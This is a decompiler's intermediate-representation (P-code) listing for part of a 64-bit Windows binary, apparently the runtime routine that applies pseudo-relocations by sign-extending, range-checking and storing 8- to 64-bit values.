(unique, 0x1000045b, 8) COPY (ram, 0x1400044f0, 8)
(unique, 0x10000453, 8) COPY (ram, 0x1400044e0, 8)
(register, 0x0, 8) INT_SEXT (register, 0x0, 4)
(unique, 0x4780, 8) INT_MULT (register, 0x0, 8) , (const, 0x28, 8)
(unique, 0x4880, 8) INT_ADD (unique, 0x4780, 8) , (const, 0xf, 8)
(register, 0x0, 8) INT_AND (unique, 0x4880, 8) , (const, 0xfffffffffffffff0, 8)
(stack, 0xffffffffffffff70, 8) COPY (const, 0x140001b4e, 8)
(ram, 0x1400070a4, 4) COPY (const, 0x0, 4)
(unique, 0x100000ba, 8) INT_2COMP (register, 0x0, 8)
(unique, 0x10000439, 8) INT_ADD (unique, 0x100000ba, 8) , (const, 0x10, 8)
(unique, 0x10000441, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff98, 8)
(unique, 0x10000493, 8) CAST (unique, 0x10000441, 8)
(unique, 0x1000049b, 8) INT_ADD (unique, 0x10000493, 8) , (unique, 0x10000439, 8)
(unique, 0x4b00, 8) CAST (unique, 0x1000049b, 8)
(unique, 0x100004a3, 8) CAST (ram, 0x1400044f0, 8)
(unique, 0x100004ab, 8) CAST (ram, 0x140004500, 8)
(register, 0x0, 8) INT_SUB (unique, 0x100004a3, 8) , (unique, 0x100004ab, 8)
(unique, 0xed00, 1) INT_SLESS (register, 0x0, 8) , (const, 0x8, 8)
 ---  CBRANCH (ram, 0x140001b11, 1) , (unique, 0xed00, 1)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (const, 0x0, 4)
(ram, 0x1400070a8, 8) COPY (unique, 0x4b00, 8)
 ---  RETURN (const, 0x0, 8)
(unique, 0x100004b3, 8) CAST (ram, 0x140004500, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100004b3, 8)
(unique, 0xef00, 1) INT_SLESS (register, 0x0, 8) , (const, 0xc, 8)
(unique, 0x100004bb, 8) CAST (ram, 0x140004500, 8)
(unique, 0x10000463, 8) COPY (unique, 0x100004bb, 8)
 ---  CBRANCH (ram, 0x140001c90, 1) , (unique, 0xef00, 1)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001e00, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x140004500, 8) , (const, 0x4, 8) , (const, 0x1, 8)
(unique, 0x100004c3, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100004c3, 8)
(unique, 0x4400, 8) PTRADD (ram, 0x140004500, 8) , (const, 0x8, 8) , (const, 0x1, 8)
(unique, 0x100004cb, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100004cb, 8)
(unique, 0x100001b2, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
(unique, 0x100001b3, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
(unique, 0x1000020f, 1) BOOL_AND (unique, 0x100001b2, 1) , (unique, 0x100001b3, 1)
 ---  CBRANCH (ram, 0x140001b9a, 1) , (unique, 0x1000020f, 1)
(unique, 0x100004d3, 8) PTRADD (ram, 0x140004500, 8) , (const, 0xc, 8) , (const, 0x1, 8)
(register, 0x18, 8) CAST (unique, 0x100004d3, 8)
 ---  BRANCH (ram, 0x140001b8d, 1)
(register, 0x18, 8) MULTIEQUAL (unique, 0x10000463, 8) , (register, 0x18, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (register, 0x18, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
(unique, 0x1000046b, 8) COPY (register, 0x18, 8)
 ---  CBRANCH (ram, 0x140001e00, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x18, 8) , (const, 0x1, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x10000483, 8) COPY (register, 0x18, 8)
(register, 0x18, 8) MULTIEQUAL (unique, 0x10000483, 8) , (unique, 0x10000463, 8)
(register, 0x0, 4) MULTIEQUAL (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 4) , (const, 0x0, 4)
(unique, 0x10000473, 8) COPY (register, 0x18, 8)
 ---  CBRANCH (ram, 0x140001e00, 1) , (register, 0x206, 1)
(register, 0x18, 8) MULTIEQUAL (unique, 0x1000046b, 8) , (unique, 0x10000473, 8) , (unique, 0x10000463, 8)
(register, 0x200, 1) INT_LESSEQUAL (ram, 0x1400044f0, 8) , (register, 0x18, 8)
 ---  CBRANCH (ram, 0x140001b11, 1) , (register, 0x200, 1)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (const, 0x0, 4)
(ram, 0x1400070a8, 8) COPY (unique, 0x4b00, 8)
 ---  RETURN (const, 0x0, 8)
(stack, 0xffffffffffffff70, 8) MULTIEQUAL (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (unique, 0x4b00, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0x18, 8) MULTIEQUAL (register, 0x18, 8) , (register, 0x18, 8)
(unique, 0x100004db, 8) PTRADD (register, 0x18, 8) , (const, 0x1, 8) , (const, 0x4, 8)
(unique, 0x4400, 8) CAST (unique, 0x100004db, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x30, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (register, 0x18, 8)
(register, 0x18, 8) PTRADD (register, 0x18, 8) , (const, 0x2, 8) , (const, 0x4, 8)
(unique, 0x100004e3, 8) PTRADD (unique, 0x10000453, 8) , (register, 0x30, 8) , (const, 0x1, 8)
(register, 0x30, 8) CAST (unique, 0x100004e3, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (register, 0x30, 8)
(register, 0x38, 4) INT_ADD (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(unique, 0x100003d6, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x100004eb, 8) CAST (unique, 0x100003d6, 8)
(unique, 0x100004f3, 8) INT_ADD (unique, 0x100004eb, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x100004f3, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x3b9, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001e26, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x3ba, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x3ba, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x3ba, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x3ba, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x3ba, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x3ba, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x3ba, 4)
 ---  CALL (ram, 0x140001980, 8) , (register, 0x30, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x3bc, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x3bc, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x3bc, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x3bc, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x3bc, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x3bc, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x30, 8) , (register, 0x38, 4)
(register, 0x200, 1) INT_LESS (register, 0x18, 8) , (unique, 0x1000045b, 8)
 ---  CBRANCH (ram, 0x140001e10, 1) , (register, 0x200, 1)
(unique, 0x4400, 8) PTRADD (register, 0x18, 8) , (const, 0x2, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x140001e40, 1) , (register, 0x206, 1)
(unique, 0x10000406, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x100004fb, 8) CAST (unique, 0x10000406, 8)
(unique, 0x10000503, 8) INT_ADD (unique, 0x100004fb, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x10000503, 8)
(unique, 0x10000226, 8) PTRSUB (const, 0x0, 8) , (const, 0x140001e4c, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x380, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (unique, 0x10000226, 8)
(unique, 0x1000022e, 8) COPY (const, 0x1400043c0, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x381, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x381, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x381, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x381, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x381, 4)
(ram, 0x1400070a8, 8) INDIRECT (unique, 0x4b00, 8) , (const, 0x381, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x381, 4)
 ---  CALL (ram, 0x140001910, 8) , (unique, 0x1000022e, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x1, 4)
(unique, 0x1000050b, 8) PTRADD (register, 0x18, 8) , (const, 0x3, 8) , (const, 0x4, 8)
(register, 0x18, 8) CAST (unique, 0x1000050b, 8)
(register, 0x200, 1) INT_LESSEQUAL (ram, 0x1400044f0, 8) , (register, 0x18, 8)
 ---  CBRANCH (ram, 0x140001b11, 1) , (register, 0x200, 1)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (const, 0x0, 4)
(ram, 0x1400070a8, 8) COPY (unique, 0x4b00, 8)
 ---  RETURN (const, 0x0, 8)
(stack, 0xffffffffffffff70, 8) MULTIEQUAL (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8) , (unique, 0x4b00, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0x18, 8) MULTIEQUAL (register, 0x18, 8) , (register, 0x18, 8) , (register, 0x18, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (register, 0x18, 8)
(register, 0x0, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0x4400, 8) PTRADD (register, 0x18, 8) , (const, 0x2, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x4400, 8) PTRADD (register, 0x18, 8) , (const, 0x1, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x38, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0x10000513, 8) PTRADD (unique, 0x10000453, 8) , (register, 0x0, 8) , (const, 0x1, 8)
(register, 0x0, 8) CAST (unique, 0x10000513, 8)
(register, 0x8, 4) INT_AND (unique, 0xdb00, 4) , (const, 0xff, 4)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (register, 0x0, 8)
(unique, 0x1000051b, 8) PTRADD (unique, 0x10000453, 8) , (register, 0x38, 8) , (const, 0x1, 8)
(register, 0x38, 8) CAST (unique, 0x1000051b, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x8, 4) , (const, 0x20, 4)
 ---  CBRANCH (ram, 0x140001d58, 1) , (register, 0x206, 1)
(unique, 0xe600, 1) INT_LESS (const, 0x20, 4) , (register, 0x8, 4)
 ---  CBRANCH (ram, 0x140001bd0, 1) , (unique, 0xe600, 1)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x8, 4) , (const, 0x40, 4)
 ---  CBRANCH (ram, 0x140001e32, 1) , (register, 0x206, 1)
(unique, 0x10000523, 8) CAST (register, 0x38, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x10000523, 8)
(unique, 0x1000052b, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (unique, 0xdc00, 8) , (unique, 0x1000052b, 8)
(register, 0x30, 8) INT_ADD (register, 0x30, 8) , (unique, 0xdc00, 8)
(register, 0x8, 4) INT_AND (unique, 0xdb00, 4) , (const, 0xc0, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001db0, 1) , (register, 0x206, 1)
(unique, 0x100003be, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x10000533, 8) CAST (unique, 0x100003be, 8)
(unique, 0x1000053b, 8) INT_ADD (unique, 0x10000533, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x1000053b, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x1cf, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001db8, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x1d0, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x1d0, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x1d0, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x1d0, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x1d0, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x1d0, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x1d0, 4)
 ---  CALL (ram, 0x140001980, 8) , (register, 0x38, 8)
(unique, 0x10000543, 8) CAST (register, 0x38, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x1d2, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x1d2, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x1d2, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x1d2, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x1d2, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x1d2, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000543, 8) , (register, 0x30, 8)
 ---  BRANCH (ram, 0x140001c22, 1)
(register, 0x207, 1) INT_SLESS (const, 0xffffffffffffffff, 8) , (register, 0x30, 8)
(unique, 0x1000021a, 4) COPY (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001c22, 1) , (register, 0x207, 1)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x8, 4) , (const, 0x8, 4)
 ---  CBRANCH (ram, 0x140001cb0, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x8, 4) , (const, 0x10, 4)
 ---  CBRANCH (ram, 0x140001e32, 1) , (register, 0x206, 1)
(register, 0x10, 8) INT_ZEXT (register, 0x8, 4)
(unique, 0x100003ee, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x1000054b, 8) CAST (unique, 0x100003ee, 8)
(unique, 0x10000553, 8) INT_ADD (unique, 0x1000054b, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x10000553, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x1d8, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001e40, 8)
(unique, 0x10000236, 8) COPY (const, 0x1400043f8, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x1d9, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x1d9, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x1d9, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x1d9, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x1d9, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x1d9, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x1d9, 4)
 ---  CALL (ram, 0x140001910, 8) , (unique, 0x10000236, 8) , (register, 0x10, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x1, 4)
(unique, 0x1000055b, 8) CAST (register, 0x38, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000055b, 8)
(register, 0x30, 8) INT_ZEXT (unique, 0xda80, 2)
(register, 0x10, 4) INT_AND (unique, 0xdb00, 4) , (const, 0xc0, 4)
(unique, 0x10000563, 2) CAST (unique, 0xda80, 2)
(register, 0x207, 1) INT_SLESS (unique, 0x10000563, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x140001dc0, 1) , (register, 0x207, 1)
(unique, 0x10000565, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (register, 0x30, 8) , (unique, 0x10000565, 8)
(register, 0x30, 8) INT_OR (register, 0x30, 8) , (const, 0xffffffffffff0000, 8)
(unique, 0x1000056d, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (register, 0x30, 8) , (unique, 0x1000056d, 8)
(register, 0x30, 8) MULTIEQUAL (register, 0x30, 8) , (register, 0x30, 8)
(unique, 0x1000041e, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x0, 4)
(unique, 0x10000416, 8) INT_ADD (register, 0x30, 8) , (unique, 0xdc00, 8)
 ---  CBRANCH (ram, 0x140001c05, 1) , (unique, 0x1000041e, 1)
(unique, 0xea80, 1) INT_SLESS (unique, 0x10000416, 8) , (const, 0xffffffffffff8000, 8)
 ---  CBRANCH (ram, 0x140001c73, 1) , (unique, 0xea80, 1)
(unique, 0xef00, 1) INT_SLESS (const, 0xffff, 8) , (unique, 0x10000416, 8)
 ---  CBRANCH (ram, 0x140001c73, 1) , (unique, 0xef00, 1)
(unique, 0x1000032e, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x10000575, 8) CAST (unique, 0x1000032e, 8)
(unique, 0x1000057d, 8) INT_ADD (unique, 0x10000575, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x1000057d, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x24d, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001c1f, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x24e, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x24e, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x24e, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x24e, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x24e, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x24e, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x24e, 4)
 ---  CALL (ram, 0x140001980, 8) , (register, 0x38, 8)
(register, 0x30, 2) SUBPIECE (unique, 0x10000416, 8) , (const, 0x0, 4)
(unique, 0x10000585, 8) CAST (register, 0x38, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x250, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x250, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x250, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x250, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x250, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x250, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000585, 8) , (register, 0x30, 2)
(unique, 0x1000058d, 8) CAST (register, 0x38, 8)
(unique, 0xd980, 1) LOAD (const, 0x1b1, 4) , (unique, 0x1000058d, 8)
(register, 0x30, 8) INT_ZEXT (unique, 0xd980, 1)
(register, 0x10, 4) INT_AND (unique, 0xdb00, 4) , (const, 0xc0, 4)
(unique, 0x10000595, 1) CAST (unique, 0xd980, 1)
(register, 0x207, 1) INT_SLESS (unique, 0x10000595, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x140001de8, 1) , (register, 0x207, 1)
(unique, 0x10000596, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (register, 0x30, 8) , (unique, 0x10000596, 8)
(register, 0x30, 8) INT_OR (register, 0x30, 8) , (const, 0xffffffffffffff00, 8)
(unique, 0x1000059e, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (register, 0x30, 8) , (unique, 0x1000059e, 8)
(register, 0x30, 8) MULTIEQUAL (register, 0x30, 8) , (register, 0x30, 8)
(unique, 0x10000427, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x0, 4)
(unique, 0x1000041f, 8) INT_ADD (register, 0x30, 8) , (unique, 0xdc00, 8)
 ---  CBRANCH (ram, 0x140001cd3, 1) , (unique, 0x10000427, 1)
(unique, 0xef00, 1) INT_SLESS (const, 0xff, 8) , (unique, 0x1000041f, 8)
 ---  CBRANCH (ram, 0x140001c73, 1) , (unique, 0xef00, 1)
(unique, 0xea80, 1) INT_SLESS (unique, 0x1000041f, 8) , (const, 0xffffffffffffff80, 8)
 ---  CBRANCH (ram, 0x140001c73, 1) , (unique, 0xea80, 1)
(register, 0x18, 8) PTRADD (register, 0x18, 8) , (const, 0x3, 8) , (const, 0x4, 8)
(unique, 0x10000376, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x100005a6, 8) CAST (unique, 0x10000376, 8)
(unique, 0x100005ae, 8) INT_ADD (unique, 0x100005a6, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x100005ae, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x2d1, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001cee, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x2d2, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x2d2, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x2d2, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x2d2, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x2d2, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x2d2, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x2d2, 4)
 ---  CALL (ram, 0x140001980, 8) , (register, 0x38, 8)
(register, 0x30, 1) SUBPIECE (unique, 0x1000041f, 8) , (const, 0x0, 4)
(unique, 0x100005b6, 8) CAST (register, 0x38, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x2d4, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x2d4, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x2d4, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x2d4, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x2d4, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x2d4, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x100005b6, 8) , (register, 0x30, 1)
(register, 0x200, 1) INT_LESS (register, 0x18, 8) , (unique, 0x1000045b, 8)
 ---  CBRANCH (ram, 0x140001c2f, 1) , (register, 0x200, 1)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (register, 0x38, 8)
(register, 0x30, 8) INT_ZEXT (unique, 0xdb00, 4)
(register, 0x10, 4) INT_AND (unique, 0xdb00, 4) , (const, 0xc0, 4)
(unique, 0x100005be, 4) CAST (unique, 0xdb00, 4)
(register, 0x207, 1) INT_SLESS (unique, 0x100005be, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001dd8, 1) , (register, 0x207, 1)
(unique, 0x100005c2, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (register, 0x30, 8) , (unique, 0x100005c2, 8)
(register, 0x30, 8) INT_OR (register, 0x30, 8) , (const, 0xffffffff00000000, 8)
(unique, 0x100005ca, 8) CAST (register, 0x0, 8)
(register, 0x30, 8) INT_SUB (register, 0x30, 8) , (unique, 0x100005ca, 8)
(register, 0x30, 8) MULTIEQUAL (register, 0x30, 8) , (register, 0x30, 8)
